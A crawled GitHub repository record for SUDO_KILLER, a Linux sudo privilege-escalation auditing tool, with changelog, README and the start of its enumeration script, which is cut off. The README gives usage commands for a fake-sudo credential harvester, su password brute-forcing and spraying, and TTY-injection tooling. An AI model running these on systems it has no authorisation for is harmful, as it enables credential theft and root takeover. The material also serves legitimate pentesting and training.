{
  "metadata": {
    "timestamp": 1736568362468,
    "page": 291,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjMwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "TH3xACE/SUDO_KILLER",
      "stars": 2266,
      "defaultBranch": "V3",
      "files": [
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 1.7724609375,
          "content": "# Change Log\nAll notable changes to the project SUDO_KILLER will be documented in this file.\n \n\n## [Version 2] - 2023\n \n### Added\n - Display Timestamp (amount of time in minutes between instances of sudo before it will re-prompt for a password) was added.\n - Detection CVE-2023-22809 was added\n - Exploit for CVE-2023-22809 was added\n - Video showing exploitation of CVE-2023-22809 was added\n - Adding excessive sudo rights check - implies a user is root\n - Adding check for MITRE Attack TTP T1548.003 (sudo caching)\n\n### Changed\n \n### Fixed\n  - Bug Correction\n\n\n\n\n## [Version 2] - 2021\n \n### Added\n - Exploit for CVE-2021-3156 was added\n - Detection for CVE-2021-3156 was added\n - Detection for CVE-2021-23240 was added\n - Exploit for CVE-2019-18634 was added\n - Docker environment to test CVE-2019-18634 was added\n - Video showing exploitation of CVE-2019-18634 was added\n - Video showing exploitation of CVE-2021-3156 was added\n - New dangerous bins added (more than 70)\n \n### Changed\n \n### Fixed\n  - Arguments bug correction\n\n\n\n\n## [Version 2] - 2020-02-11\n \n### Added\n - New checks and/or scenarios : CVE-2019-14287 - runas\n - New checks and/or scenarios : No CVE yet - sudoedit - absolute path\n - New checks and/or scenarios : CVE-2019-18634 - pwfeedback\n - New checks and/or scenarios : User Impersonation\n - New checks and/or scenarios : list of users in sudo group\n - Testing environment : A docker to play with the tool and different scenarios, you can also train on PE.\n - New functionality: offline mode - ability to extract the required info from audited system and run SK on host.\n - New videos\n   \n### Changed\n  - Continous improvement of the way output presented\n \n### Fixed\n  - Performance improved\n  - Bugs corrected (checks, export, report,...)\n  - Annonying password input several time removed\n\n"
        },
        {
          "name": "CVE",
          "type": "tree",
          "content": null
        },
        {
          "name": "FUNDING.yml",
          "type": "blob",
          "size": 0.0322265625,
          "content": "github: TH3xACE\npatreon: TH3xACE\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.052734375,
          "content": "MIT License\n\nCopyright (c) 2019 David Blais [TH3xACE]\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 19.1630859375,
          "content": "![Static Badge](https://img.shields.io/badge/Version-3.0.1-blue)\n![GitHub last commit (branch)](https://img.shields.io/github/last-commit/TH3xACE/SUDO_KILLER/V3)\n![Static Badge](https://img.shields.io/badge/Maintain-Yes-purple)\n![Static Badge](https://img.shields.io/badge/Author-TH3xACE-red)\n[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/TH3xACE/SUDO_KILLER/)\n\n:star: Star us on GitHub â€” to show your support!\n\n<p align=\"left\">\n    <img width=\"100%\" src=\"https://github.com/TH3xACE/res/blob/main/SK/sk-logo.gif\" alt=\"logo\"/>\n</p>\n\n\n[![Twitter](https://img.shields.io/twitter/url/https/twitter.com/cloudposse.svg?style=social&label=%40TH3xACE)](https://twitter.com/th3xace)\n[![LinkedIn](https://img.shields.io/badge/-LinkedIn-black.svg?style=flat-square&logo=linkedin&colorB=blue)](https://www.linkedin.com/in/adblais)\n\n :bulb: Best Viewed in Dark Mode :)\n\n\n- [Contributing](#contributing)\n  - [Stargazers over time](#stargazers-over-time)\n  - [Support](#support)\n  - [Credits](#credits)\n  - [Disclaimer](#disclaimer)\n  - [License](#license)\n\n<a name=\"intro\"></a>\n## Introduction\n\n`SUDO_KILLER` is a tool geared towards cyber security practitioners (pentesters, security auditors, system admins, CTF players and Infosec students), facilitating privilege escalation within Linux environments. It focuses on vulnerabilities tied to SUDO usage, including misconfigurations in sudo rules, version-based weaknesses (CVEs and other vulnerabilities), and risky binary deployments (GTFOBINS). These weak points can be exploited to gain ROOT-level privileges or impersonate other users.\n\n`SUDO_KILLER` provides a catalog of potential commands and local exploits for manual privilege elevation. Importantly, it refrains from automated exploitation, requiring users to carry out the exploitation process themselves as per its intended usage.\n\n<a name=\"check\"></a>\n## Checks\n\nBelow is a list of checks that are perform by `SUDO_KILLER`\n- Misconfigurations\n- Dangerous Binaries (GTFOBINS)\n- Vulnerable versions of sudo - CVEs\n- Sudo vulnerability and misconfiguration related to 3rd party apps\n- Dangerous Environment Variables\n- Credential Harvesting\n- Writable directories where scripts reside\n- Binaries that might be replaced\n- Identify missing scripts\n- ...\n\n> [!WARNING]\n> The check list above is NOT exhaustive.\n\n<a name=\"usage\"></a>\n## Usage \n\nTo get started with SUDO_KILLER, you can either git clone or download the zip. If you want to practice and/or test it, there is a vulnerable testing enviroment (using docker). See the related video which provides an overview on how to setup the docker and run SUDO_KILLER. Several scenarios can be setup in the docker environment and can be used for testing different misconfigurations or flaws. Alternatively, you can run it on the system to be audited to check for misconfigurations and/or flaws related to sudo.\n\n```shell\n./SUDO_KILLERv<version>.sh -c -a -e -r report.txt -p /tmp\n```\n\nOptional arguments:\n</br>-c : includes CVE checks</br>\n-a : includes CVEs related to third party apps/devices </br>\n-i : import (offline mode) from extract.sh </br>\n-e : include export of sudo rules / sudoers file </br>\n-r : report name (save the output) </br>\n-p : path where to save export and report </br>\n-s : supply user password for sudo checks (If sudo rules is not accessible without current user's password) </br>\n-h : help\n\n> [!NOTE]\n> It is worth noting that when using the -c argument, two types of check are provided one for which the CVE identified is solely based on the current sudo version being used and another where the requirements are also checked.\n> Very often, a sudo version might be vulnerable but some pre-requisites might be needed for a successful exploitation.\n\n> [!NOTE]\n> Providing password: If a password is needed to run sudo -l then the script will not work if you don't provide a password with the argument -s.\n\n<a name=\"docker\"></a>\n### Docker (Vulnerable testing environment)\n\n<p align=\"left\">\n    <img width=\"25%\" src=\"https://github.com/TH3xACE/res/blob/main/SK/docker.gif\" alt=\"-dockerlogo\"/>\n</p>\n\nA range of Docker containers is made available to offer a deliberately vulnerable environment for testing and hands-on experimentation with `SUDO_KILLER` as well as with the vulnerabilities. \n\n```shell\nservice docker start \ndocker pull th3xace/sudo_killer_demo3\ndocker run --rm -it th3xace/sudo_killer_demo3\n```\n```shell\n(This docker is only to test the CVE-2019-18634 (pwfeedback))\nservice docker start \ndocker pull th3xace/sudo_killer_demo2\ndocker run --user 1000 --rm -it th3xace/sudo_killer_demo2\n```\n\n## Why is it possible to run \"sudo -l\" without a password?\n\nBy default, if the NOPASSWD tag is applied to any of the entries for a user on a host, you will be able to run \"sudo -l\" without a password. This behavior may be overridden via the verifypw and listpw options.\n\nHowever, these rules only affect the current user, so if user impersonation is possible (using su), sudo -l should be launched from this user as well.\n\nSometimes the file /etc/sudoers can be read even if sudo -l is not accessible without password.\n\n\n<a name=\"scenarios\"></a>\n## Scenarios\n\nTo switch scenario (To prevent conflicts between the different scenarios) on the docker (demo3):\n\n```shell\nswitchScenario <scenario_number>\n\nAvailable scenarios: 0 to 10\nAll Scenarios 0 : Conflict might occur!\nScenario 1: [2,3] CVE - Rules\nScenario 2: [4] Excessive permissions\nScenario 2: [5] Excessive permissions (Authentication required)\nScenario 3: [6] User Impersonation\nScenario 4: [7] Common Misconfiguration (Change owner)\nScenario 4: [8,11] Common Misconfiguration (Wildcard)\nScenario 5: [13] Missing scripts from sudo rules\nScenario 6: [17] Dangerous Environment Variables\nScenario 7: [18] Dangerous binaries (gtfobins)\nScenario 8: [19] Recursive Impersonation test\nScenario 9: [20] Environment Path Hijacking\nScenario 10: [21] App Specific sudo vuln/misconfig\nScenario 11: [5] Excessive permissions (Authentication required)\nScenario 12: [16] Backdooring sudo (Credentials Capture)\n```\n\n<a name=\"videos\"></a>\n## Videos - Demo \n\n### Setup and exploitation\nThe playlist can be found here: [https://www.youtube.com/watch?v=Q8iO9mYrfv8&list=PLQPKPAuCA40FMpMKWZLxQydLe7rPL5bml](https://www.youtube.com/watch?v=VjXiLhmOmHs&list=PLQPKPAuCA40ERFDNZ-Ub58SgGHGKAcr26)\n\n> [!IMPORTANT]\n> Quick videos on how to properly do the testing on the provided docker.\n\n<details open>\n<summary>\n     (click to expand) Usage : How to setup and use the provided testing environment (docker)\n</summary> <br />\n    \n<p align=\"center\">\n   <a href=\"https://youtu.be/Q8iO9mYrfv8\">  \n      <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide1.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n   <a href=\"https://youtu.be/VjXiLhmOmHs\">  \n      <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide2.JPG\" alt=\"apis\"/>\n   </a>\n</p>\n\n<p></p>\n\n</p>    \n</details>\n\n> [!WARNING]\n> The video list below is not exhaustive, to have access to all the videos, please check the playlist link.\n\n<details open>\n<summary>\n     Several videos are provided below with different scenarios of exploitation.\n</summary> <br />\n    \n<p align=\"center\">\n   <a href=\"https://youtu.be/rg6FxPuP8sQ\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide3.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n   <a href=\"https://youtu.be/BBtoBrZdAKk\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide9.JPG\" alt=\"apis\"/>\n   </a>\n</p>\n\n<p align=\"center\">\n   <a href=\"https://youtu.be/XiLsS9v3hy8\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide10.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/eBfIotMsDiI\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide11.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/a68dAmgeJnA\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide12.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/CILd01m2GBs\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide13.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/4xectsHBfCQ\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide14.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/11q5pzGJxvk\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide15.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/BbPBxXy4rKY\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide16.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/sfkxoR2a99o\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide17.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/SV2KPd4CA8A\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide18.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/6Lt-wKZmH9c\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide19.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n    \n</details>\n\n<a name=\"CVEs\"></a>\n## CVEs\n\n<details open>\n<summary>\n  (click to expand) CVEs related to SUDO that SUDO_KILLER detects (including pre-requisites): \n</summary> <br />\n\n<p align=\"center\">\n   <a href=\"https://youtu.be/THS_bn4MOQY\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide4.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/6VkZaj3FDiE\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide5.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/LhqbExt5oq0\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide7.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/AJSSRrGt-Dw\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide8.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/elwGRlN7aCI\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide6.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n</p> \n\n\n</details>\n\n<details open>\n<summary>\n  (click to expand) Recent CVEs of 3rd party apps/devices related to sudo that SUDO_KILLER detects (including pre-requisites): \n</summary> <br />\n\n<p align=\"center\">\n   <a href=\"https://youtu.be/CP0S_7aZHxA\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide27.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    \n</p> \n\n\n\n</details>\n\n\n<a name=\"sk-tools\"></a>\n## SK-Tools\nVersion 3 of `SUDO_KILLER` now includes a list of tools that can be used to achieve several tasks. The scripts are located at `SUDO_KILLERv3/SUDO_KILLER/SK-Tools/`\n\n- $\\color{#f0a015}\\large{\\textsf{SK-ImperBruteForce-NoPwd.sh:}}$ Perform an impersonation bruteforce using users from /etc/passwd, starting from user with uid 1000.\n- $\\color{#f0a015}\\large{\\textsf{SK-credHarvest2.sh:}}$ Perform a credential capture by creating a fake sudo via alias then re-direct to real sudo.\n- $\\color{#f0a015}\\large{\\textsf{SK-app-check.sh:}}$ Perform check of sudo vulnerabilities related to a specifc third-party app or device or programming lang [still in progress].\n- $\\color{#f0a015}\\large{\\textsf{SK-ttyInject.sh:}}$ Abusing TTY pushback so that if the user root su - on a controlled user we make him run an arbitrary command.\n- $\\color{#f0a015}\\large{\\textsf{SK-recursive-impersonate.sh:}}$ Perform identification of recursive impersonation with a default depth of 3.\n- $\\color{#f0a015}\\large{\\textsf{SK-alias-report.sh:}}$ Perform search on alias with different criteria.\n- $\\color{#f0a015}\\large{\\textsf{SK-csuid-with-sudo.sh:}}$ Perform identification of custom suid binary then check whether sudo command is run without full path.\n- $\\color{#f0a015}\\large{\\textsf{SK-su-BruteForce.sh:}}$ Perform password bruteforce or password spray for a specific user via sudo.\n- $\\color{#f0a015}\\large{\\textsf{SK-search-sudoers.sh:}}$ Perform an identification of possible sudoers backup files on the current host.\n\n\n<details open>\n<summary>\n     (click to expand) Usage : SK-Tools\n</summary> <br />\n    \n<p align=\"center\">\n   <a href=\"https://youtu.be/Oc1yuploiME\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide20.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/aoofrCyb6KA\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide21.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/gUDuZVwVWyU\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide22.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/7VqNCgYvEa0\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide23.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/AG1o6s4dEF0\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide24.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/woF68JmJ33c\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide25.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n<p align=\"center\">\n   <a href=\"https://youtu.be/R3_u-G5AyUw\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide26.JPG\" alt=\"apis\"/>\n   </a>\n&nbsp;\n    <a href=\"https://youtu.be/Vpr00SxIVgo\">  \n     <img width=\"39%\" src=\"https://github.com/TH3xACE/res/blob/main/SK3/Slide28.JPG\" alt=\"apis\"/>\n   </a>\n</p> \n\n</details>\n\n</br>\n\n### Capturing Credentials via sudo redirect (SK-credHarvest2.sh)\nThe script SK-credHarvest2.sh from SK-Tools allow to perform a credential capture by creating a fake sudo via alias then re-direct to real sudo. Actually works only for bash (not working/implemented for ZSH or else for now)configured linux.\n\nThe displayed message when asking for credential when using sudo differs from the version being used. It is possible to choose between two options (differ based on OS version).\nExample of the displayed message (new and old)\n\n> [!TIP]\n> (new) [sudo] password for user: <br />\n> (old) Password: \n\nFor All Users (auser):\nWhen you have root privilege or excessive rights on users' home and you want an easy way to gather credentials:\n```shell\n./SK-credHarvest2.sh auser <new|old> ; source /home/*/.bashrc\n```\nFor the currrent user (cuser):\n```shell\n./SK-credHarvest2.sh cuser <new|old> ; source /home/<currentuser>/.bashrc\n```\n> [!CAUTION]\n> TO STOP the credential harvesting: run the same script again with same argument\n\noutput: the log /tmp/sk-crds.log will contains the credentials\n\n\n### Alias' Audit (SK-alias-report.sh)\nYou will either need root privilege, access to a backup of sudoers or read access to /etc/sudoers.\n\n```shell\nUsage: ./SK-alias-sudoers.sh -p <sudoers_path> -k <keyword> [-u] [-r] [-m] [-c] | [-a]\n  where -u: user | -r: runas | -m: host | -c: command | -a: all\n```\n\n### Bruteforce/Password Spray via su (SK-su-BruteForce.sh) \nUsing su to bruteforce password and password spray with concurrency, timeout and sleep. \n\n```shell\nUsage: ./SK-su-BruteForce.sh [-h|--help] [-m|--module MODULE] [-u|--user USER|-uf|--userfile USERFILE] [-p|--password PASSWORD|-pf|--pwdfile PASSFILE] [-c|--concurrent CONCURRENT] [-s|--sleep SLEEP] [-t|--timeouts TIMEOUTS]\n\nModule: Password Bruteforce : pwdbf\nExample: ./SK-su-BruteForce.sh -m \"pwdbf\" -u user -pf password.txt -c 5 -s 0.005 -t 0.9\n\nModule: Password Spray : pwdspr\nExample: ./SK-su-BruteForce.sh -m pwdspr -uf users.txt -p password -c 5 -s 0.005 -t 0.9 \n\nModule: User:Password Bruteforce : usrpwdbf\nExample: ./SK-su-BruteForce.sh -m usrpwdbf -uf users-pwd.txt  -c 5 -s 0.005 -t 0.9 \n```\n\n### Search for backup of the file sudoers (SK-search-sudoers.sh)\nFind possible sudoers backup files in /mnt/ /opt/ /etc/ /etc/ /home/ /app*/  and any additional one parse as argument\n\n```shell\nUsage: ./SK-search-sudoers.sh /tmp/\n```\n\n### Update dangerous bins - GTFOBINS (SK_dbins_update.sh) \nTo update the dangerous bins, go to dbins/update and run ./SK_dbins_update.sh. Make sure you have internet connection.\n\n```shell\nUsage: ./SK_dbins_update.sh\n```\n\n### Binary Relative Path (SK-relative-path.sh)\nLooking for binaries with relative path that be abused! if there is no secure_path set.\n\n```shell\nsudo -l\n<..snip..>\n(root) SETENV: NOPASSWD: /opt/support/purge.sh\n<..snip..>\n\nUsage: ./SK-relative-path.sh /opt/support/purge.sh\n```\n\n\n<a name=\"contribute\"></a>\n# Contributing\n\n`SUDO_KILLER` is an open-source project and highly appreciate any contributions. Whether you are helping us fix bugs, proposing new features, improving our documentation or spreading the word - we would love to have you as a contributor. Please reach me on twitter or Linkedin if you have any suggestions, feedback or want to contribute, you can also create a Pull Request. I am looking for contribution on the sudo CVEs related to 3rd party (I have a list of about 175) and any help would be appreciated.\n\n- Bug Report: If you see an error message or run into an issue while using `SUDO_KILLER`, please create a [bug report](https://github.com/TH3xACE/SUDO_KILLER/issues/new?assignees=&labels=type%3A+bug&template=bug.yaml&title=%F0%9F%90%9B+Bug+Report%3A+).\n\n- Feature Request: If you have an idea or you're missing a capability that would make development easier and more robust, please submit a [feature request](https://github.com/TH3xACE/SUDO_KILLER/issues/new?assignees=&labels=type%3A+feature+request&template=feature.yml).\n\n<a name=\"stars\"></a>\n## Stargazers over time \n\nThank you all for your support!\n\n[![Stargazers over time](https://starchart.cc/TH3xACE/SUDO_KILLER.svg?variant=adaptive)](https://starchart.cc/TH3xACE/SUDO_KILLER)\n\n\n\n<a name=\"support\"></a>\n## Support\n\n<a href=\"https://www.patreon.com/TH3xACE\">\n\t<img src=\"https://c5.patreon.com/external/logo/become_a_patron_button@2x.png\" width=\"160\">\n</a>\n\n<a name=\"credits\"></a>\n## Credits\n\nI crafted the script independently, leveraging online resources from GitHub and other sources in the wild. Acknowledgments are also due to the creators/publishers of exploits associated with the CVEs. You can trace back their details and references in the exploit itself, as well as in the accompanying notes when the tool is executed. Notable recognition extends to Vincent Puydoyeux, whose inspiration spurred the development of this tool, and Koutto, for invaluable assistance in handling Docker intricacies and enhancing the tool's functionality. Additionally, a heartfelt thank you goes out to Emilio Pinna (norbemi) and Andrea Cardaci (cyrus_and) for their invaluable contributions to GTFO Bins, which significantly influenced this project's development.\n\n<a name=\"disclaimer\"></a>\n## Disclaimer\n\nThis script is for educational purpose ONLY. Do not use it without permission of the owner of the system you are running it in. The usual disclaimer applies, especially the fact that me (TH3xACE) is not liable for any damages caused by direct or indirect use of the information or functionality provided by this project. The author (TH3xACE) or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of the script is not the author responsibility.\n\n<a name=\"license\"></a>\n## License\n\n`SUDO_KILLER` is licensed under the MIT license, proper credits is expected whenever used. Please consider to donate for any commercial use.\n"
        },
        {
          "name": "SK-Tools",
          "type": "tree",
          "content": null
        },
        {
          "name": "SUDO_KILLERv3.sh",
          "type": "blob",
          "size": 88.52734375,
          "content": "#!/bin/bash\n# This script was developed to check for common misconfigurations and vulnerabilities of the sudo\n# V1: Date Created : 08/12/2018\n# V2: Date Created : 11/02/2020\n# V3: Date Created : 20/07/2023\n# Date of last modification : 25/01/2024\n# @TH3xACE - BLAIS David\n\nversion=\"version 3.0.1\"\n\n##### (Cosmetic) Colour output\nRED=\"\\033[01;31m\"    # Issues/Errors\nGREEN=\"\\033[01;32m\"  # Success\nYELLOW=\"\\033[01;33m\" # Warnings/Information\nBLUE=\"\\033[01;34m\"   # Heading\nBOLD=\"\\033[01;01m\"   # Highlight\nRESET=\"\\033[00m\"     # Normal\n\n##### help function\nusage() {\n  #####  echo -e \" $version \\n\"\n  # printf \" %s \\n\" \"$version\"\n  echo -e \" Example: ./sudo_killer.sh -c -r report.txt -e /tmp/  \\n\"\n\n  echo \"OPTIONS:\"\n  echo \"-c  Includes CVEs related to sudo's version\"\n  echo \"-a  Includes CVEs related to third party apps/devices\"\n  echo \"-i  import (offline mode) from extract.sh\"\n  echo \"-e  Include export of sudo rules / sudoers file\"\n  echo \"-r  Enter report name\"\n  echo \"-p        path where to save export and report\"\n  echo \"-s        Supply user password for sudo checks (NOT SECURE)\"\n  #               echo \"-t        Include thorough (lengthy) tests\"\n  echo \"-h        Displays this help text\"\n  echo -e \"\\n\"\n  echo \"Running with no options = limited scans/no output file\"\n\n  echo -e \" ######################################################### \"\n}\n\n#------------------------------------------------------\n\nheader() {\n\n  cat <<\"EOF\"\n   _____ _    _ _____   ____    _  _______ _      _      ______ _____\n  / ____| |  | |  __ \\ / __ \\  | |/ /_   _| |    | |    |  ____|  __ \\\n | (___ | |  | | |  | | |  | | | ' /  | | | |    | |    | |__  | |__) |\n  \\___ \\| |  | | |  | | |  | | |  <   | | | |    | |    |  __| |  _  /\n  ____) | |__| | |__| | |__| | | . \\ _| |_| |____| |____| |____| | \\ \\\n |_____/ \\____/|_____/ \\____/  |_|\\_\\_____|______|______|______|_|  \\_\\                                  \nEOF\n  echo -e \"${BLUE}                                                          $version${RESET}\\n\"\n\n  # CANARY\n}\n\n#------------------------------------------------------\n\nfunction versionToInt() {\n  #   set -e\n  #   local IFS=.\n  #   local parts=($1)\n  #   local val=$((1000000*parts[0]+1000*parts[1]+parts[2]))\n  #   cnver=$val\n  local IFS=.\n  parts=($1)\n  let val=1000000*parts[0]+1000*parts[1]+parts[2]\n  cnver=$val\n}\n\ninit() {\n  if [ -n \"$import\" ]; then\n    sudover=$(grep \"Sudo version\" \"$import\")\n  else\n    sudover=$(sudo -V 2>/dev/null | grep \"Sudo version\" 2>/dev/null)\n  fi\n\n  sudover1=$(echo \"$sudover\" | sed 's/Sudo version //g' | cut -d\"p\" -f 1)\n\n  if [ -n \"$sudover1\" ]; then\n    versionToInt \"$sudover1\"\n  fi\n\n  if [ -z \"$cnver\" ]; then\n    echo \"Error: The tool has not been able to convert the sudo's version!\"\n  fi\n\n  if [ -n \"$path\" ]; then\n    vpath=\"$path/sudo_killer-export-$(date +'%d-%m-%y')\"\n  else\n    vpath=\"/tmp/sudo_killer-export-$(date +'%d-%m-%y')\"\n  fi\n\n  # Create the directory\n  mkdir -p \"$vpath\"\n} # init\n\n#------------------------------------------------------\n\nchecksudoersize() {\n\n  file_path=\"/etc/sudoers\"\n\n  # Check if the file exists\n  if [ -f \"$file_path\" ]; then\n    # Get the file size in bytes using ls and awk\n    file_size_bytes=$(ls -al \"$file_path\" | awk '{print $5}')\n\n    # Check if the file size is between 600 bytes and 770 bytes (inclusive)\n    if ((file_size_bytes >= 600 && file_size_bytes <= 770)); then\n      echo -e \"${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems there is no custom sudo's rules! (size) ${BOLD}${RED}[DEFAULT] ${RESET} \\n\"\n      #echo \"The file size is between 600 bytes and 770 bytes.\"\n    else\n      #echo \"The file size is not between 600 bytes and 770 bytes.\"\n      echo -e \"${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems that custom sudo's rules for the current user exists! (size) ${BOLD}${RED}[CUSTOM]${RESET} \\n\"\n    fi\n  else\n    echo \"File not found: $file_path\"\n  fi\n\n}\n\nchecksudoerstimestamp() {\n\nmaccrdate=$(ls -al /etc/ssh/ | grep -iw \"ssh_host_rsa_key.pub\" | awk '{print $6,$7,$8}')\nsudoerscrdate=$(ls -al /etc/sudoers | awk '{print $6,$7,$8}')\n\n  if ((maccrdate == sudoerscrdate)); then\n     echo -e \"${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems there is no custom sudo's rules! (timestamp) ${BOLD}${RED}[DEFAULT] ${RESET} \\n\"\n  else\n     echo -e \"${BOLD}${YELLOW}[+] Sudo's rules:${RESET} It seems that custom sudo's rules for the current user exists! (timestamp) ${BOLD}${RED}[CUSTOM]${RESET} \\n\"\n  fi\n\n}\n\ncheckcustomsecurepath() \n{\n      sudosecpacth=$(echo \"$cmd\" 2>/dev/null | grep \"secure_path=\" | cut -d= -f 2 | sed 's/:/\\n/g' | grep -v \"bin\")\n      if [ \"$sudosecpacth\" ]; then\n            echo -e \"${BOLD}${YELLOW}[+] Custom Secure Path:${RESET} It seems that the secure path defined in sudoers includes custom path[s]! ${BOLD}${RED}[CUSTOM] ${RESET}\"\n            echo -e \"[*] secure_path: $sudosecpacth \\n\"\n      fi\n \n}\n\nintro() {\n  who=$(whoami 2>/dev/null)\n  where=$(hostname 2>/dev/null)\n  echo -e \"${BLUE} @TH3xACE - BLAIS David\"\n  echo -e \"${BLUE} Contribute and collaborate on the KILLER project @ https://github.com/TH3xACE\"\n  echo -e \"${RED} Please consider giving a +1 star on GitHub to show your support! \"\n  echo -e \"\\n\"\n  echo -e \"${RED} IMPORTANT! Always run the latest version [Current: $version]. Run 'git pull' or download the project again. ${RESET}\"\n  echo -e \"\\n\"\n  echo -e \"${BOLD}${GREEN}[+] Intro ${RESET}\"\n  echo -e \"${BOLD}${YELLOW}Scan started at:${RESET} $(date)\"\n  echo -e \"\\n\"\n  echo -e \"Current user: $who\"\n  echo -e \"Current host: $where\"\n  echo -e \"\\n\"\n\n  if [ \"$import\" ]; then\n    cmd=$(cat \"$import\" | grep -v \"Sudo version\")\n  elif [ \"$sudopass\" ]; then\n    echo -e \"${RED} [+] Please enter the password of the current user: ${RESET}\"\n    read -s -p \"[+] Password: \" userpassword\n    echo -e \"\\n*********\"\n    cmdwp=$(echo \"$userpassword\" | sudo -S -l -k 2>/dev/null)\n  else\n    cmd=$(sudo -l -k)\n    if [ -z \"$cmd\" ]; then\n      echo -e \"${BOLD}${RED}[**] It seems that sudo's rules cannot be accessed without a password.\"\n      echo -e \"Try using the '-s' argument and provide the current user's password.${RESET}\\n\"\n      echo -e 